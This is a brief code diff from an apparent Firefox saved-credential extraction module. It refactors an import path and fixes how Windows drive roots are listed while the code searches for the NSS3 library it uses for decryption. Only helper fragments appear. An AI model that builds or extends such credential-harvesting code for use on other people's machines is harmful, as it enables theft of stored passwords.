@@ -2,7 +2,7 @@ import os
 from base64 import b64decode
 from ctypes import CDLL, POINTER, c_void_p
 from string import ascii_uppercase
-from classes.firefox import NSS3NotFoundError, NSS3KeySlotCreationError, MasterPasswordDetected, SECItem, PK11SlotInfo
+from features.browsers.classes.firefox import NSS3NotFoundError, NSS3KeySlotCreationError, MasterPasswordDetected, SECItem, PK11SlotInfo
 import json
 
 
@@ -19,7 +19,7 @@ def __find_file(name, path):
 
 
 def __get_host_drives():
-    return ['%s:' % d for d in ascii_uppercase if os.path.exists('%s:' % d)]
+    return ['%s:\\' % d for d in ascii_uppercase if os.path.exists('%s:' % d)]
 
 
 def __search_nss3_dll_libarary_path():
